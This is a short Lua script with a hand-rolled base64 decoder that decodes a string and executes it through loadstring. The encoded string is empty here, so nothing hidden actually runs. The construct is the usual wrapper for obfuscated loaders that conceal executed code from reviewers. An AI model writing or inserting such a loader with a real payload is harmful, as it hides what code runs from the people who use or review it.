local B = [[]]
local function kd(s)
    local t = {}
    local set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    for i = 1, 64 do t[set:sub(i, i)] = i - 1 end
    local out, val, bits = {}, 0, 0
    for i = 1, #s do
        local c = s:sub(i, i)
        if c == "=" then break end
        local v = t[c]
        if v then
            val = val * 64 + v
            bits = bits + 6
            if bits >= 8 then
                bits = bits - 8
                out[#out + 1] = string.char(math.floor(val / (2 ^ bits)) % 256)
                val = val % (2 ^ bits)
            end
        end
    end
    return table.concat(out)
end
loadstring(kd(B))()